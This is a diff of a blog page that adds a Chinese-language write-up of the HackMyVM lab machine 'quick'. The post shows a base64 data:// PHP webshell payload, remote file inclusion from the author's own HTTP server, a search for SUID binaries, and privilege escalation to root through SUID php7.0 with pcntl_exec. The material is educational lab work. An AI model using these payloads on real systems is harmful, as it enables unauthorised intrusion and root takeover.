@@ -5,7 +5,7 @@
   <meta charset="utf-8">
   <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.0" theme-name="Stellar" theme-version="1.33.0">
   
-  <meta name="robots" content="noindex,follow">
+  
   <meta name="generator" content="Hexo 7.3.0">
   <meta http-equiv='x-dns-prefetch-control' content='on' />
   
@@ -17,22 +17,29 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
   <meta name="theme-color" content="#f9fafb">
-  <title>归档 - CMACCKK blog</title>
+  <title>quick - CMACCKK blog</title>
 
   
-    <meta property="og:type" content="website">
-<meta property="og:title" content="归档">
-<meta property="og:url" content="https://cmacckk.github.io/archives/2025/07/">
+    <meta name="description" content="使用fscan扫描发现开启了80端口，访问页面  点击下面的Home、Cars等会出现参数?page&#x3D;xxxx，猜测有文件包含，但是使用php伪协议没有包含成功，尝试远程包含，本机开启服务器 12echo &quot;test&quot; &gt; 1.phppython -m http.server 8089   发现成功访问了我的http服务器上的1.php 漏洞利用data:&#x2F;&amp;#">
+<meta property="og:type" content="article">
+<meta property="og:title" content="quick">
+<meta property="og:url" content="https://cmacckk.github.io/2025/06/11/quick/">
 <meta property="og:site_name" content="CMACCKK blog">
+<meta property="og:description" content="使用fscan扫描发现开启了80端口，访问页面  点击下面的Home、Cars等会出现参数?page&#x3D;xxxx，猜测有文件包含，但是使用php伪协议没有包含成功，尝试远程包含，本机开启服务器 12echo &quot;test&quot; &gt; 1.phppython -m http.server 8089   发现成功访问了我的http服务器上的1.php 漏洞利用data:&#x2F;&amp;#">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://cmacckk.github.io/avatar.jpg">
+<meta property="article:published_time" content="2025-06-11T00:00:00.000Z">
+<meta property="article:modified_time" content="2025-07-09T08:13:04.921Z">
 <meta property="article:author" content="CMACCKK">
-<meta name="twitter:card" content="summary">
+<meta property="article:tag" content="data伪协议">
+<meta property="article:tag" content="远程文件包含">
+<meta property="article:tag" content="php提权">
+<meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://cmacckk.github.io/avatar.jpg">
   
   
   
-  
+  <meta name="keywords" content="data伪协议,远程文件包含,php提权">
 
   <!-- feed -->
   
@@ -44,12 +51,12 @@
 
   
 
-  <script type="application/ld+json">{"@context":"https://schema.org","@type":"Website","@id":"https://cmacckk.github.io","author":{"@type":"Person","name":"CMACCKK","sameAs":[],"image":"https://cmacckk.github.io/avatar.jpg"},"name":"CMACCKK blog","description":"","url":"https://cmacckk.github.io"}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"CMACCKK","sameAs":[],"image":"https://cmacckk.github.io/avatar.jpg"},"dateCreated":"2025-06-11T00:00:00Z","dateModified":"2025-07-09T08:13:04Z","datePublished":"2025-06-11T00:00:00Z","description":"","headline":"quick","mainEntityOfPage":{"@type":"WebPage","@id":"https://cmacckk.github.io/2025/06/11/quick/"},"publisher":{"@type":"Organization","name":"CMACCKK","sameAs":[],"image":"https://cmacckk.github.io/avatar.jpg","logo":{"@type":"ImageObject","url":"https://cmacckk.github.io/avatar.jpg"}},"url":"https://cmacckk.github.io/2025/06/11/quick/","keywords":"data伪协议, 远程文件包含, php提权","thumbnailUrl":"./img/cover.png","image":1}</script>
   
 </head>
 <body>
 
-<div class="l_body index" id="start" layout="undefined" type="undefined" ><aside class="l_left"><div class="sidebg"></div><div class="leftbar-container">
+<div class="l_body content" id="start" layout="post" type="tech" ><aside class="l_left"><div class="sidebg"></div><div class="leftbar-container">
 
 
 <header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://cmacckk.github.io/avatar.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main">CMACCKK blog</div></a></div></header>
@@ -61,21 +68,106 @@
 <div class="widgets">
 <div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
 
-<widget class="widget-wrapper recent post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2025/07/09/hello-world/"><span class="title">Hello World</span></a></div></widget>
+<widget class="widget-wrapper related post-list"><div class="widget-header dis-select"><span class="name">专栏：hackmyvm</span></div><div class="widget-body"><a class="item active" href="/2025/06/11/quick/"><span class="title">quick</span><svg class="active-icon" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M21 11.098v4.993c0 3.096 0 4.645-.734 5.321c-.35.323-.792.526-1.263.58c-.987.113-2.14-.907-4.445-2.946c-1.02-.901-1.529-1.352-2.118-1.47a2.225 2.225 0 0 0-.88 0c-.59.118-1.099.569-2.118 1.47c-2.305 2.039-3.458 3.059-4.445 2.945a2.238 2.238 0 0 1-1.263-.579C3 20.736 3 19.188 3 16.091v-4.994C3 6.81 3 4.666 4.318 3.333C5.636 2 7.758 2 12 2c4.243 0 6.364 0 7.682 1.332C21 4.665 21 6.81 21 11.098" opacity=".5"/><path fill="currentColor" d="M9 5.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5z"/></svg></a></div></widget>
+
+<widget class="widget-wrapper recent post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2025/06/11/quick/"><span class="title">quick</span></a></div></widget>
 </div>
 
 </div></aside><div class="l_main" id="main">
 
-<header class="header mobile-only"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://cmacckk.github.io/avatar.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main">CMACCKK blog</div></a></div></header>
-
- 
 
 
-<div class="navbar top"><div class="navbar-blur"><div class="navbar-container"><nav class="post"><a href="/">近期发布</a><a class="active" href="/archives/">归档</a></nav></div></div></div><div class="post-list archives"><article class="" id="archive"><div class='archive-header h4'>2025</div><div class="archive-list"><a class='post fs14' href="/2025/07/09/hello-world/"><time>07-09</time><span>Hello World</span></a></div></article></div>
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" id="menu" href="/topic/">专栏</a><span class="sep"></span><a class="cap breadcrumb" id="proj" href="/2025/06/11/quick/">hackmyvm</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2025-06-11T00:00:00.000Z">2025-06-11</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2025-07-09T08:13:04.921Z">2025-07-09</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>quick</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><p>使用<code>fscan</code>扫描发现开启了<code>80</code>端口，访问页面</p>
+<p><img src="/./img/quick-1.png"></p>
+<p>点击下面的<code>Home</code>、<code>Cars</code>等会出现参数<code>?page=xxxx</code>，猜测有文件包含，但是使用<code>php</code>伪协议没有包含成功，尝试远程包含，本机开启服务器</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;test&quot;</span> &gt; 1.php</span><br><span class="line">python -m http.server 8089</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./img/quick-2.png"></p>
+<p>发现成功访问了我的<code>http</code>服务器上的<code>1.php</code></p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="data-伪协议"><a href="#data-伪协议" class="headerlink" title="data:&#x2F;&#x2F;伪协议"></a>data:&#x2F;&#x2F;伪协议</h4><p>可以直接传数据，不用包含远程服务器上的文件</p>
+<p><code>&lt;?php system($_POST[1]);?&gt;</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfUE9TVFsxXSk7Pz4=</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./img/quick-3.png"></p>
+<h4 id="远程文件包含法"><a href="#远程文件包含法" class="headerlink" title="远程文件包含法"></a>远程文件包含法</h4><p>在攻击机启动一个<code>http</code>服务器</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 8089</span><br></pre></td></tr></table></figure>
+
+<p>服务器上写一个<code>shell.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>因为这里代码应该是<code>$filename . &quot;.php&quot;</code>的类型，要过滤后面的<code>.php</code>可以在后面使用<code>?</code>和<code>#</code></p>
+<p><img src="/./img/quick-4.png"></p>
+<p>使用配置</p>
+<p><img src="/./img/quick-5.png"></p>
+<h3 id="php提权"><a href="#php提权" class="headerlink" title="php提权"></a>php提权</h3><p>尝试<code>suid</code>提权</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./img/quick-6.png">发现<code>php7.0</code>具有<code>suid</code>权限,但是在蚁剑终端里面不能提权，反弹<code>shell</code>出来</p>
+<p><img src="/./img/quick-7.png"></p>
+<p>然后使用命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/bin</span><br><span class="line">CMD=&quot;/bin/sh&quot;</span><br><span class="line">./php7.0 -r &quot;pcntl_exec(&#x27;/bin/sh&#x27;, [&#x27;-p&#x27;]);&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./img/quick-8.png"></p>
+<p><img src="/./img/quick-9.png"></p>
+</article>
+<div class="article-footer">
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    
+
+</div>
+
+
+
+
+
+
+  <div class="related-wrap md-text" id="comments">
+    <section class='header cmt-title cap theme'>
+      <p>快来参与讨论吧~</p>
+
+    </section>
+    <section class='body cmt-body beaudar'>
+      
+
+<svg class="loading" style="vertical-align:middle;fill:currentColor;overflow:hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg>
+
+<div id="beaudar" repo="cmacckk/blog-comments" issue-term="pathname" theme="preferred-color-scheme" input-position="top" comment-order="desc" loading="false" branch="main"></div>
+
+    </section>
+  </div>
+
+
+
 <footer class="page-footer footnote"><hr><div class="text"><p>本站由 <a href="/">CMACCKK</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.0">Stellar 1.33.0</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
 </div></footer>
 <div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
-</aside><div class='float-panel'>
+<div class="widgets">
+
+
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#data-%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-text">data:&#x2F;&#x2F;伪协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%B3%95"><span class="toc-text">远程文件包含法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E6%8F%90%E6%9D%83"><span class="toc-text">php提权</span></a></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg><span>回到顶部</span></a><a class="buttom" onclick="util.scrollComment()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5" d="M8 10.5h8M8 14h5.5M17 3.338A9.95 9.95 0 0 0 12 2C6.477 2 2 6.477 2 12c0 1.6.376 3.112 1.043 4.453c.178.356.237.763.134 1.148l-.595 2.226a1.3 1.3 0 0 0 1.591 1.592l2.226-.596a1.63 1.63 0 0 1 1.149.133A9.96 9.96 0 0 0 12 22c5.523 0 10-4.477 10-10c0-1.821-.487-3.53-1.338-5"/></svg><span>参与讨论</span></a></div></widget>
+</div></aside><div class='float-panel'>
   <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
     <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
   </button>
@@ -569,6 +661,31 @@
 
 
 <!-- optional -->
+
+  <script type="module">
+  const el = document.querySelector('#comments #beaudar');
+  util.viewportLazyload(el, load_beaudar, false);
+
+  function load_beaudar() {
+    if (!el) return;
+    try {
+      el.innerHTML = '';
+    } catch (error) {
+      console.error(error);
+    }
+    const script = document.createElement('script');
+    script.src = 'https://beaudar.lipk.org/client.js';
+    script.async = true;
+    for (const key of Object.keys(el.attributes)) {
+      const attr = el.attributes[key];
+      if (['class', 'id'].includes(attr.name) === false) {
+        script.setAttribute(attr.name, attr.value);
+      }
+    }
+    el.appendChild(script);
+  }
+</script>
+
 
 
 
